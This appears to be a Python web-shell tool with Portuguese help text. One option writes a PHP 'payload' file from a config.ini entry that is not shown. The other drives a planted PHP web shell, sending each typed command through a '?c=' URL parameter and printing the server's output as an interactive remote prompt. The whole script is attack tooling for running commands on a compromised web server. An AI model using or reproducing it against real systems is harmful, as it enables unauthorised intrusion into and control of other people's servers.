from argparse import ArgumentParser
from configparser import ConfigParser
from requests import get
from time import sleep
from sys import stdout


parser = ArgumentParser()
parser.add_argument("-u", dest="shell_url", action="store",
                    help="Url de sua shell!")
parser.add_argument("-g", dest="generate", action="store",
                    help="Cria seu payload")
args = parser.parse_args()

for i in range(50):
    print("/-\|"[i % 4], end="\b")
    stdout.flush()
    sleep(0.1)

if args.generate:
    shell_name = str(args.generate)
    shell = shell_name+'.php'
    opfile = open(shell,'+w')
    config = ConfigParser()
    config.read_file(open('config.ini'))

    opfile.write(config['DEFAULT']['code'])
    opfile.close()
    print('Generated file '+shell)

if args.shell_url:
    pwd = get(args.shell_url + "?c=pwd").text.replace("\n", "")
    pwd += "$ "
    while True:
        command = input(pwd)
        result = get(args.shell_url + "?c=" + command).text
        print(result)
